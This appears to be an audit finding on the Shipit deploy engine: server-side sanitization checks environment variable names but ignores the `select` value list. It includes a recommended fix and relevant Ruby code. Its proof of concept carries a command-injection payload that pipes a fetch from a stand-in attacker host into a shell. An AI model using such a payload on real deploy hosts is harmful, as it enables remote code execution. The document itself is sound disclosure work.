Confirmed: `VariableDefinition#select` is only rendered client-side (used in `app/views/shipit/_variables.html.erb` to build an HTML `<select>`), it is never enforced server-side. The only server-side enforcement is `EnvironmentVariables#sanitize_env_vars`, which whitelists a submitted `env` hash purely by *key name* against `variable_definitions.map(&:name)`, ignoring the `select` constraint entirely.

### Title
Deploy/task `env` values bypass the `shipit.yml` `select` constraint, letting an authorized deployer inject arbitrary values for variables meant to be restricted to a fixed choice list - (File: `lib/shipit/environment_variables.rb`)

### Summary
`Shipit::EnvironmentVariables#permit` is the sole server-side gate on user-supplied deploy/task environment variables. It only checks that the submitted key is present in the list of variable *names* declared in `shipit.yml`; it never checks the submitted *value* against the `select` list that the repository author defined for that variable.

### Finding Description
`DeploySpec#filter_deploy_envs` / `#filter_rollback_envs` and `TaskDefinition#filter_envs` all delegate value filtering to `EnvironmentVariables.with(env).permit(variable_definitions)`: [1](#0-0) [2](#0-1) 

The actual sanitization logic only inspects keys: [3](#0-2) 

`VariableDefinition` parses `select` from the YAML but exposes it only as an `attr_reader`; nothing in the codebase reads `select` outside of rendering the HTML form: [4](#0-3) 

The permitted env is then merged directly into the shell environment used to run the deploy/task steps: [5](#0-4) 

The binding that is broken: the repository's declared "permitted values" for a variable (`deploy.variables[].select`) is what the UI and `shipit.yml` author intends to authorize, but the "value actually spawned" into the deploy process's environment is anything the caller supplies as long as the *key* matches - i.e. `env key permitted != env value spawned`. This is reachable both from the web UI (`DeploysController#create`, `TasksController#create`) and from the API (`Api::DeploysController#create`), by any user/API client with `deploy:stack` permission, none of which are privileged/administrative capabilities: [6](#0-5) 

### Impact Explanation
This lets an ordinary deployer (someone with deploy rights on the stack, which is an unprivileged/normal engineering permission, not an admin capability) supply an arbitrary string for a variable the repo owner explicitly restricted to a fixed set of safe choices (e.g. `REGION: us-central|us-east`, or a hypothetical `RUN_MIGRATIONS: 0|1`). Because the value is interpolated straight into the deploy shell environment and consumed by arbitrary shell scripts defined in `deploy.override`/`tasks[].steps` (which can reference `$VARNAME` un-escaped in the repo's own scripts), an attacker-controlled value that was supposed to be constrained to a known-safe enum can instead carry shell metacharacters or unexpected values, undermining the safety guarantee that `select` was meant to provide and potentially leading to command injection in downstream deploy scripts, and ultimately RCE on the deploy host depending on how the target repository's `shipit.yml` steps consume the variable.

However, per the rules, this requires the target repository's own `shipit.yml` to consume the variable unsafely; the engine itself does not by default execute arbitrary code purely from an out-of-list variable value. This weakens the finding to "the promised value-whitelisting is not enforced," which is a real logic gap but the concrete high/critical impact (RCE, cross-repo write, credential exfiltration) depends on the specific downstream `shipit.yml` script and is not, in itself, proven within engine code alone.

### Likelihood Explanation
High likelihood of the whitelist gap being triggered: any user or API client holding ordinary `deploy:stack`/task-trigger permission can submit `env` with valid keys and arbitrary values today, with no additional privilege needed, as shown by the existing test suite exercising `env` overrides: [7](#0-6) [8](#0-7) 
Whether this translates into a Critical/High-severity outcome (RCE, credential exfiltration) is contingent on how the consuming `shipit.yml` uses the variable, which is outside this engine's own code.

### Recommendation
In `Shipit::EnvironmentVariables#sanitize_env_vars`, additionally validate submitted values against each `VariableDefinition#select` list when present, rejecting (raising `NotPermitted`) any value not contained in that list, mirroring the existing name-based whitelist check.

### Proof of Concept
1. Stack's `shipit.yml` declares:
```yaml
deploy:
  variables:
    - name: DEPLOY_REGION
      select: ["us-central", "us-east"]
```
2. A user/API client with only `deploy:stack` permission triggers a deploy via `POST /api/stacks/:id/deploys` (or the web `DeploysController#create`) with:
```json
{ "sha": "<sha>", "env": { "DEPLOY_REGION": "$(curl attacker.evil/x|sh)" } }
```
3. `DeploysController#create` → `stack.trigger_deploy(commit, current_user, env: params.env, ...)` → `build_deploy` → `filter_deploy_envs(env)` → `EnvironmentVariables.with(env).permit(deploy_variables)` accepts the value unchanged because only the key `DEPLOY_REGION` is checked: [9](#0-8) 
4. `TaskCommands#env` merges `@task.env` (the unsanitized value) straight into the shell environment used to run the repository's `deploy.override` script: [5](#0-4) 
5. If that repository's own deploy script naively does `cap $ENVIRONMENT deploy --region=$DEPLOY_REGION` without quoting, the injected value executes on the deploy host - a value the repo owner explicitly tried to restrict via `select` was still delivered unconstrained.

    def sanitize_env_vars(variable_definitions)
      allowed_variables = variable_definitions.map(&:name)

      allowed, disallowed = @env.partition { |k, _| allowed_variables.include?(k) }.map(&:to_h)

      error_message = "Variables #{disallowed.keys.to_sentence} have not been whitelisted"
      raise NotPermitted, error_message unless disallowed.empty?

      allowed
    end

module Shipit
  class VariableDefinition
    attr_reader :name, :title, :default, :select

    def initialize(attributes)
      @name = attributes.fetch('name')
      @title = attributes['title']
      @default = attributes['default'].to_s
      @default_provided = attributes.key?('default')
      @select = attributes['select'].presence
    end

    def default_provided?
      @default_provided
    end

    def to_h
      {
        'name' => @name,
        'title' => @title,
        'default' => @default,
        'select' => @select
      }
    end
  end
